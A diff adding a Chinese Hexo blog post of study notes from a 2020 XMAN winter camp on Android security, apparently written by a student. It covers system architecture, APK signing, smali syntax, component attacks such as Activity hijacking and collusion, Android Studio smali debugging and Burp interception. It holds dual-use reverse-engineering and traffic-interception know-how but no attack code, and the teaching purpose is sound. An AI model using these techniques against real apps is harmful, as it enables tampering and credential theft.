@@ -1,0 +1,1171 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="2020年xman冬令营-哈尔滨营，以“移动安全”为主题，内容主要为移动应用安全渗透测试，移动应用程序逆向，移动恶意应用分析，Android内核漏洞分析，物联网Iot设备漏洞挖掘。概述、该文档仅作为学习笔记。  第一天梆梆安全张宁老师，以安卓逆向基础为主，内容从安卓系统架构与运行机制到安卓逆向常用工具与hook技术、以及安卓四大组件相关安全问题。 第二天腾讯玄武实验室m4bln老师，以安卓逆向为主">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Android移动安全">
+<meta property="og:url" content="http://example.com/2020/01/23/android_sec/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="2020年xman冬令营-哈尔滨营，以“移动安全”为主题，内容主要为移动应用安全渗透测试，移动应用程序逆向，移动恶意应用分析，Android内核漏洞分析，物联网Iot设备漏洞挖掘。概述、该文档仅作为学习笔记。  第一天梆梆安全张宁老师，以安卓逆向基础为主，内容从安卓系统架构与运行机制到安卓逆向常用工具与hook技术、以及安卓四大组件相关安全问题。 第二天腾讯玄武实验室m4bln老师，以安卓逆向为主">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/android_stack.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/%E5%90%AF%E5%8A%A8_top.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/%E5%90%AF%E5%8A%A8_init.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/%E5%90%AF%E5%8A%A8_zygote.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/%E5%BA%94%E7%94%A8%E6%A0%BC%E5%BC%8F.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/%E7%AD%BE%E5%90%8D%E6%95%88%E9%AA%8C.webp">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/%E7%AD%BE%E5%90%8D%E6%A0%A1%E9%AA%8C%E5%AE%8C%E6%95%B4.webp">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/smali%E7%B1%BB%E5%9E%8B.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AF%BC%E5%87%BA.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/debug_smali_1.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/debug_smali_2.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/debug_smali_3.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/burp_grab.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/apk_structure.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/activity_lifecycle.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/liucheng.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/apk_decom.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/frida_xposed.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/frida_hook.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/apk_protect.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/dex_protect.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/geekpwn_1.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/antian_1.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/antian_2.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/antian_3.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/antian_4.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/antian_5.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads/2020/01/antian_6.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/antian_7.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/antian_8.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/antian_9.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/antian_10.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/antian_11.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/%E6%94%BB%E5%87%BB%E9%9D%A2.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/%E5%BC%80%E6%BA%90.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/root%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/%E8%84%8F%E7%89%9B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/dirty_cow_1.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/dirty_cow_2.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/dirty_cow_3.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/dirty_cow_4.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/dirty_cow_5.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/binder_1.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/binder_2.png">
+<meta property="og:image" content="http://handsomedog.top/wp-content/uploads//2020/01/syzkaller.png">
+<meta property="article:published_time" content="2020-01-23T08:41:36.000Z">
+<meta property="article:modified_time" content="2022-12-07T06:14:47.894Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Android">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://handsomedog.top/wp-content/uploads//2020/01/android_stack.png">
+  
+  
+  
+  <title>Android移动安全 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Android移动安全"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2020-01-23 16:41" pubdate>
+          2020年1月23日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          18k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          148 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Android移动安全</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><code>2020年xman冬令营-哈尔滨营</code>，以“移动安全”为主题，内容主要为移动应用安全渗透测试，移动应用程序逆向，移动恶意应用分析，Android内核漏洞分析，物联网Iot设备漏洞挖掘。<br>概述、该文档仅作为学习笔记。</p>
+<ul>
+<li>第一天梆梆安全张宁老师，以安卓逆向基础为主，内容从安卓系统架构与运行机制到安卓逆向常用工具与hook技术、以及安卓四大组件相关安全问题。</li>
+<li>第二天腾讯玄武实验室m4bln老师，以安卓逆向为主，讲解了逆向流程，安卓端的逆向特点，以及反调试、代码混淆等知识。</li>
+<li>第三天安天的老师，介绍了实战中移动端安全，从地下产业到移动端APT对抗，更高级的apk分析手段、方法，以及现安全公司所面临难题，对机器学习应用与移动端安全领域做了简单的概述。</li>
+<li>第四天复旦白泽dotsu师傅分享了CTF中的安卓相关问题。</li>
+<li>第五天华为的海归博士、木子李大师傅给大家分享了分布式网络以及华为分布式终端相关知识、介绍了基于短距通信的漏洞挖掘基础知识，内容包括Wifi、Bluetooth、等基础知识、介绍性分析了终端的网络攻击面。着重讲解了俗称p2p网络wifi-direct协议。</li>
+<li>第六天腾讯玄武实验室刘慧明老师、针对更高级的知识—-安卓内核漏洞挖掘做了讲解，介绍安卓内核linux内核基础知识、开源协议等，针对安卓内核攻击面以及利用整体思路进行了简单介绍。重点讲解dirty cow漏洞原理、cve-2019-2215内核漏洞，着重介绍了fuzz技术，内核fuzz工具AFL、Syzkaller。</li>
+<li>第七天结营赛。</li>
+</ul>
+<p>整理一份ppt以及相关资料（哈工大营）：链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1b0AfIwxdjDn7aSzgFkNPQQ">https://pan.baidu.com/s/1b0AfIwxdjDn7aSzgFkNPQQ</a> 提取码：d4lh</p>
+<h2 id="第一天-01月13日"><a href="#第一天-01月13日" class="headerlink" title="第一天 01月13日"></a>第一天 01月13日</h2><h3 id="Android系统架构与运行机制"><a href="#Android系统架构与运行机制" class="headerlink" title="Android系统架构与运行机制"></a>Android系统架构与运行机制</h3><h4 id="五层架构"><a href="#五层架构" class="headerlink" title="五层架构"></a>五层架构</h4><ul>
+<li><p>应用层 <code>Apps</code></p>
+</li>
+<li><p><code>API</code> 层 <code>Java API Framework</code></p>
+<ul>
+<li><code>Content Provider</code>：内容提供器 </li>
+<li><code>View System</code>：视图系统，构建应用基本组件</li>
+<li><code>Activity</code>：活动管理</li>
+<li><code>Location</code>：位置管理</li>
+<li><code>Package</code>：包管理</li>
+<li><code>Notification</code>：通知管理</li>
+<li><code>Telephony</code>：电话管理</li>
+<li><code>Window</code>：窗口管理</li>
+<li><code>Resource</code>：资源管理系统运行库 Native C&#x2F;C++ Librares</li>
+</ul>
+</li>
+<li><p>系统运行库 <code>Native C/C++ Librares</code></p>
+<ul>
+<li><code>C/C++</code>程序库</li>
+<li><code>Android</code>运行时库：核心库、<code>ART</code></li>
+<li><code>JVM</code>是<code>java</code>虚拟机，基于栈，执行<code>.class</code>和<code>jar</code>文件。其没有共享机制，使用<code>JIT</code>编译器</li>
+<li><code>DVM</code>是基于寄存器的虚拟机，执行<code>dex</code>文件。允许在有限的内存中同时运行多个进程。由<code>Zygote</code>创建和初始化。具有共享机制，使用<code>JIT</code>编译器</li>
+<li><code>ART</code>(Android 6.0加入)系统性能显著提升，启动更快运行更快，体验流畅，触感反馈即时。更长的电池续航，支持更低的硬件。在<code>apk</code>安装时使用预编译技术</li>
+</ul>
+</li>
+<li><p>硬件抽象层 <code>Hardware Abstraction Layer (HAL)</code></p>
+<ul>
+<li>位于操作系统内核与硬件电路之间的接口层，其目的在于将硬件抽象化。这类似于计算机网络链路层，将下面硬件封装起来。</li>
+</ul>
+</li>
+<li><p>Linux内核层 <code>Linux Kernel</code></p>
+</li>
+</ul>
+<p>总结一下如下图所示：</p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/android_stack.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h4 id="运行机制"><a href="#运行机制" class="headerlink" title="运行机制"></a>运行机制</h4><p>可以将其简化为三步：<code>Init</code>启动 —–&gt; <code>Zygote</code>进程启动 ——-&gt;<code>Systemserver</code>进程启动</p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/%E5%90%AF%E5%8A%A8_top.png" srcset="/img/loading.gif" lazyload alt="img "></p>
+<p>首先是<code>Init</code>进程启动：下图为按下电源键后的启动过程，Android设备启动要经过3个阶段，<code>BootLoader</code>、<code>Linux Kernel</code>和<code>Android</code>系统服务，一般情况下，他们都会相应的启动对动画对应。：</p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/%E5%90%AF%E5%8A%A8_init.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>严格上讲，Android系统实际上是运行于Linux内核之上的一系列”服务进程”，并不算一个完成意义上的**”操作系统”**；而这一系列进程是维持Android设备正常工作的关键，所以它们肯定有一个”根进程”，这个”根进程”衍生出了这一系列进程。这个”根进程”就是init进程。init进程是Android系统启动的第一个进程。它通过解析init.rc脚本来构建出系统的初始形态。其他的”一系列”Android系统进程大部分也是通过”init.rc”来启动的。因为要兼容不同的开发商，所以init.rc脚本的语法很简单，并且采用的是纯文本编辑的，这样导致它可读性就会很高。</p>
+<p><code>init</code>是<code>Linux</code>系统中用户空间的第一个进程(pid&#x3D;1)，<code>Linux Kernel</code>启动后，会调用<a target="_blank" rel="noopener" href="https://link.jianshu.com/?t=http://androidxref.com/6.0.1_r10/xref/system/core/init/init.cpp">&#x2F;system&#x2F;core&#x2F;init&#x2F;Init.cpp</a>的<code>main()</code>方法。</p>
+<p>Zygote进程启动：</p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/%E5%90%AF%E5%8A%A8_zygote.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="Android应用渗透测试与调试"><a href="#Android应用渗透测试与调试" class="headerlink" title="Android应用渗透测试与调试"></a>Android应用渗透测试与调试</h3><p>所需工具：</p>
+<ul>
+<li>Android Debug Bridge (ADB)，它是Android开发&#x2F;测试人员不可替代的强大工具。</li>
+<li>Apktool，又名“Android的Burp套件”，是用于Android攻击的必备工具。可以解压反编译apk文件，并修改后重新打包。</li>
+<li>Android Studio，用于Android开发的标准环境，可以用它来修改程序。</li>
+<li>BurpSuite，可以用作代理来检查往返于测试设备的流量。</li>
+<li>Firda，可以将自己的脚本注入到应用程序的运行进程中。可以用于检查被调用的功能，应用程序的网络连接以及绕过证书固定。</li>
+<li>Jadx，反编译工具。</li>
+</ul>
+<h4 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h4><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/%E5%BA%94%E7%94%A8%E6%A0%BC%E5%BC%8F.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h4 id="安装包签名效验"><a href="#安装包签名效验" class="headerlink" title="安装包签名效验"></a>安装包签名效验</h4><p>在消息通信时，必须至少解决两个问题：一是确保消息来源的真实性，二是确保消息不会被第三方篡改。在安装Apk时，同样需要确保Apk来源的真实性，以及Apk没有被第三方篡改。如何解决这两个问题呢？方法就是开发者对Apk进行签名：在Apk中写入一个“指纹”。指纹写入以后，Apk中有任何修改，都会导致这个指纹无效，Android系统在安装Apk进行签名校验时就会不通过，从而保证了安全性。</p>
+<p>要了解如何实现签名，需要了解两个基本概念：数字摘要和数字证书。</p>
+<ul>
+<li>数字摘要，将任意长度的消息变成固定长度的短消息，它类似于一个自变量是消息的函数，也就是Hash函数。数字摘要就是采用单向Hash函数将需要加密的明文“摘要”成一串固定长度的密文，这一串密文又称为数字指纹，它有固定的长度，而且不同的明文摘要成密文，其结果总是不同的，而同样的明文其摘要必定一致。</li>
+</ul>
+<p>如何效验：<img src="http://handsomedog.top/wp-content/uploads//2020/01/%E7%AD%BE%E5%90%8D%E6%95%88%E9%AA%8C.webp" srcset="/img/loading.gif" lazyload alt="img"></p>
+<ul>
+<li>数字证书，接收方必须要知道发送方的公钥和所使用的算法。如果数字签名和公钥一起被篡改，接收方无法得知，还是会校验通过。如何保证公钥的可靠性呢？答案是数字证书，数字证书是身份认证机构（Certificate Authority）颁发的，包含了以下信息：证书颁发机构、证书颁发机构签名、证书绑定的服务器域名、证书版本、有效期、签名使用的加密算法（非对称算法，如RSA）、公钥。</li>
+</ul>
+<p>完整的效验过程：</p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/%E7%AD%BE%E5%90%8D%E6%A0%A1%E9%AA%8C%E5%AE%8C%E6%95%B4.webp" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>Android提供了两种对Apk的签名方式，一种是基于JAR的签名方式，另一种是基于Apk的签名方式，它们的主要区别在于使用的签名文件不一样：jarsigner使用keystore文件进行签名；apksigner除了支持使用keystore文件进行签名外，还支持直接指定pem证书文件和私钥进行签名。</p>
+<p>相关签名命令：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jarsigner </span>-verify apkpath<br><span class="hljs-keyword">jarsigner </span>--verbose -certs apkpath<br>keytool -list -v -keystore keystore_file -storepass pwd<br>keytool -printcert -<span class="hljs-keyword">jarfile </span>apk<br></code></pre></td></tr></table></figure>
+
+<h4 id="smali代码"><a href="#smali代码" class="headerlink" title="smali代码"></a>smali代码</h4><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/smali%E7%B1%BB%E5%9E%8B.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>对象</strong>以<code>Lpackage/name/ObjectName;</code>的形式表示。前面的<code>L</code>表示这是一个对象类型，<code>package/name/</code>是该对象所在的包，<code>ObjectName</code>是对象的名字，<code>;</code>表示对象名称的结束。相当于<code>java</code>中的<code>package.name.ObjectName</code>。</p>
+<p>例如：<code>Ljava/lang/String;</code>相当于<code>java.lang.String</code></p>
+<p><strong>数组的表示形式</strong></p>
+<p><code>[I</code>，表示一个整型一维数组，相当于<code>java</code>中的<code>int[]</code>。对于多维数组，只要增加<code>[</code>就行了。<code>[[I</code>相当于<code>int[][]</code>，<code>[[[I</code>相当于<code>int[][][]</code>。</p>
+<p><strong>对象数组的表示</strong></p>
+<p><code>[Ljava/lang/String;</code>表示一个<code>String</code>对象数组。</p>
+<p><strong>方法</strong>通常必须详细的指定方法类型<code>（？the type that contains the method）</code> 方法名，参数类型，返回类型，所有这些信息都是为虚拟机是能够找到正确的方法并执行。</p>
+<p>方法表示形式：<code>Lpackage/name/ObjectName;-&gt;MethodName(III)Z</code></p>
+<p>在上面的例子中，<code>Lpackage/name/ObjectName;</code>表示类型，<code>MethodName</code>是方法名。<code>III</code>为参数（在此是3个整型参数），<code>Z</code>是返回类型（<code>boolean</code>）。</p>
+<p>方法的参数是一个接一个的，中间没有隔开。</p>
+<p>一个更复杂的例子：<code>method(I[[IILjava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;</code></p>
+<p>在java中则为：<code>String method(int, int[][], int, String, Object[])</code></p>
+<h4 id="组件安全"><a href="#组件安全" class="headerlink" title="组件安全"></a>组件安全</h4><ul>
+<li><code>Activity</code>：<ul>
+<li>关于自定义权限。参数介绍，<code>name</code>：权限名，<code>protectionLevel</code>：权限级别。权限级别介绍：</li>
+<li><code>normal</code>：正常权限，该权限并不会给用户或者设备的隐私带来风险，不声明默认为<code>nomal</code>。</li>
+<li><code>dangerous</code>：危险权限，该级别的权限通常会给用户的数据或设备的隐私带来风险，<code>Android6.0</code>以上需要动态申请</li>
+<li><code>signature</code>：只有相同签名的应用才能使用该权限</li>
+</ul>
+</li>
+</ul>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AF%BC%E5%87%BA.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<ul>
+<li><p><strong>Activity劫持</strong>，当用户安装了带有<code>Activity</code>劫持功能的恶意程序后，恶意程序会遍历系统中运行的程序，当检测到需要劫持的<code>Activity</code>（通常是网银或其他网络程序的等登陆界面）在前台运行时，恶意程序就会启动一个带<code>FLAG_ACTIVITY_NEW_TASK</code>标志的钓鱼式<code>Activity</code>覆盖正常的<code>Activity</code>，从而欺骗输入用户名或密码信息，当用户输入完信息后，程序就会将信息发送到指定的网址或邮箱，然后切换到正常的<code>Activity</code>中。这就是<code>Activity</code>劫持原理。从受影响的角度看，<code>Activity</code>属于用户层安全。</p>
+</li>
+<li><p><strong>串谋攻击</strong>，举例，<code>app A</code>本身无任何权限，它想要“联网并下载某个文件到<code>sd</code>卡上”，这在正常情况下是不允许的，<code>app B</code>拥有联网与写<code>sd</code>卡的权限，并实现了文件下载与保存功能。此时呢，<code>A</code>可以通过访问<code>B</code>来实现文件的下载，从而突破<code>Android</code>系统的权限控制。</p>
+</li>
+<li><p>Service</p>
+<ul>
+<li><code>Service</code>组件是<code>Android</code>系统中的后台进程，主要的功能是在后台进行一些耗时的操作。与其他的<code>Android</code>组件一样，当声明<code>Service</code>时指定了<code>Intent</code>过滤器，该<code>Service</code>默认就可以被外部访问。可以访问的方法有：</li>
+</ul>
+<p><code>startService()</code>：启动服务，可以被用来实现串谋攻击。</p>
+<p><code>bindService()</code>：绑定服务，可以被用来实现串谋攻击。</p>
+<p><code>stopService()</code>：停止服务，对程序功能进行恶意破坏。</p>
+<p>对于恶意的<code>stopService</code>，它破解程序的执行环境，直接影响到程序的正常运行。要想杜绝<code>Service</code>组件被人恶意的启动或者停止，就需要使用<code>Android</code>系统的权限机制来对调用者进行控制。如果Service组件不想被程序外的其他组件访问，可以直接设置它的<code>android:exported</code>属性为<code>false</code>，如果是同一作者的多个程序共享使用该服务，则可以使用自定义的权限。</p>
+</li>
+</ul>
+<h4 id="WebView安全"><a href="#WebView安全" class="headerlink" title="WebView安全"></a>WebView安全</h4><ul>
+<li>WebView任意代码执行</li>
+<li>WebView密码明文存储</li>
+<li>WebView域控制不严格</li>
+</ul>
+<h4 id="敏感信息安全"><a href="#敏感信息安全" class="headerlink" title="敏感信息安全"></a>敏感信息安全</h4><ul>
+<li>证书文件</li>
+<li>逻辑js文件</li>
+<li>logcat日志</li>
+<li>图片文件</li>
+<li>其他文件</li>
+<li>进程安全，内存访问和修改，通过对客户端内存的访问，有可能会得到保存在内存中的敏感信息（如登录密码，账号等）。测试客户端内存中是否存在的敏感信息（卡号、明文密码等）。</li>
+<li>本地端口开放检测</li>
+<li>外部动态加载DEX安全风险检测</li>
+</ul>
+<h4 id="Android-Studio调试Smali配置"><a href="#Android-Studio调试Smali配置" class="headerlink" title="Android Studio调试Smali配置"></a>Android Studio调试Smali配置</h4><p>我的Android Studio版本是：<code>3.5.3</code>，模拟器为<code>Android 9.0</code>。</p>
+<p>1、在<code>Android Studio</code>上安装<code>smalidea</code>插件，这个插件需要下载后安装，<code>File-&gt;Setting-&gt;Plugins-&gt;install from disk</code>。</p>
+<p>2、安装<code>Apktool</code>，按照官网教程即可。</p>
+<p>3、使用<code>Android Studio</code>将<code>apktool</code>反编译后文件夹作为项目导入，<code>File -&gt; New -&gt; Import project</code>。</p>
+<p>4、配置项目<code>configuration</code>：</p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/debug_smali_1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>5、接下来配置SDK，<code>File -&gt; project structure -&gt; sdk</code>。</p>
+<p>6、从<code>AVD manager</code>启动模拟器，进入开发者选项，选择<code>debug application</code>，打开<code>wait for debugger</code>。</p>
+<p>7、开始debugger Attach：</p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/debug_smali_2.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>进行调试：</p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/debug_smali_3.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h4 id="Android模拟器使用burpsuite抓包"><a href="#Android模拟器使用burpsuite抓包" class="headerlink" title="Android模拟器使用burpsuite抓包"></a>Android模拟器使用burpsuite抓包</h4><p>我使用的<code>Android Studio</code>带的官方模拟器，在电脑上开启<code>burpsuite</code>，打开<code>options</code>添加电脑在局域网中的<code>ip</code>，监听端口（任意指定）。打开启动的<code>AVD</code>的<code>setting</code>，其中有<code>proxy</code>设置，设置为对应的ip和端口即可。</p>
+<p>这里手机上安装burp证书需要特别说明一下，需要把后缀<code>.der</code>修改为<code>.cer</code>。</p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/burp_grab.png" srcset="/img/loading.gif" lazyload alt="img"></p>
